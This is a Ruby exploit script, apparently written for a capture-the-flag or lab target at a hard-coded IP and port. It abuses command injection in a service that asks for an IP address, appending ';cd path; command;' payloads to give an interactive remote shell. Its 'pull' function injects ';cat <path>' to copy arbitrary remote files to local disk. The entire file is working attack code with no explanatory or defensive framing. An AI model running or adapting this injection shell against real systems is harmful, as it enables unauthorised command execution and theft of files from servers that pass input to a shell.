#!/usr/bin/ruby

IP_ADDRESS = '157.230.179.99'
PORT = 1337
REMOTE_PROMPT = "Enter IP address: "
CD_REGEX = /^\s*cd\s*(.*?)\s*$/
PULL_REGEX = /^\s*pull\s+(.*?)\s+(.*?)\s*$/i
ABSOLUTE_PATH = /^\s*\/.*?$/
DOUBLE_DOT = /^\s*\.\.\s*$/

class CdDir
  attr_reader :path

  # internally should have an absolute path
  def path= path_to_set
    if path_to_set.size == 0 then
      return
    end

    path_components = path_to_set.split('/') - [ '' ]
    @path_components ||= []

    if path_to_set =~ ABSOLUTE_PATH
      @path_components = path_components if path_components
      @path = path_to_set
    elsif path_to_set =~ DOUBLE_DOT
      @path_components.pop
      @path = '/' + @path_components.join( '/' )
    else
      # alter the stored path to include the new path
      @path_components = @path_components + path_components
      @path = '/' + @path_components.join( '/' )
    end
    #puts @path_components
    #puts @path_components.size
  end

  def initialize path_to_set
    path_components = path_to_set.split('/') - [ '' ]
    @path_components = path_components if path_components
    @path = path_to_set
  end

  def path_prompt
    if @path_components.size == 0
      '/'
    else
      @path_components.join( '/' )
    end
  end
end

def shell wd
  require 'socket'
  # print a shell prompt w/ the directory
  # allow the user to enter a command
  # if it's a cd command then change the CdDir
  # if it's a command then output the ; cd ; <command>
  # capture the output and show it on the screen for the user
  prompt = wd.path_prompt + '> '
  print prompt
  while input = gets.chomp do
    case input
      when /^\s*quit\s*$/i
        break
      when /^\s*logout\s*$/i
        break
      when /^\s*exit\s*$/i
        break
      when CD_REGEX
        wd.path = CD_REGEX.match( input )[ 1 ]
        string_to_send = ";cd #{wd.path};"
      else
        string_to_send = ";cd #{wd.path}; #{input};"
    end

    s = TCPSocket.new IP_ADDRESS, PORT
    s.gets
    s.gets
    s.read ( REMOTE_PROMPT.size )
    #puts "Sending #{string_to_send}"

    s.puts string_to_send

    s.each_line do |line|
      puts line
    end
    prompt = wd.path_prompt + '> '
    print prompt
  end
  s.close
end

def pull remote, local
  # run cat on the remote
  # capture output to the local file
  require 'socket'
  s = TCPSocket.new IP_ADDRESS, PORT
  out = File.open( local, 'w' )
  s.gets
  s.gets
  s.read ( REMOTE_PROMPT.size )
  string_to_send = ";cat #{remote}"
  s.puts string_to_send
  s.each_line do |line|
    out.puts line
  end
  out.close
end

menu = "Please type your selection:\n1. shell\n2. pull <remote-path> <local-path>\n3. help\n4. quit"

wd = CdDir.new '/'

puts menu
while selection = gets.chomp do
  case selection
    when /^\s*quit\s*$/i
      break
    when /^\s*shell\s*$/i
      shell wd
    when PULL_REGEX
      pull PULL_REGEX.match( selection )[ 1 ], PULL_REGEX.match( selection )[ 2 ]
    else
  end
  puts menu
end

__END__
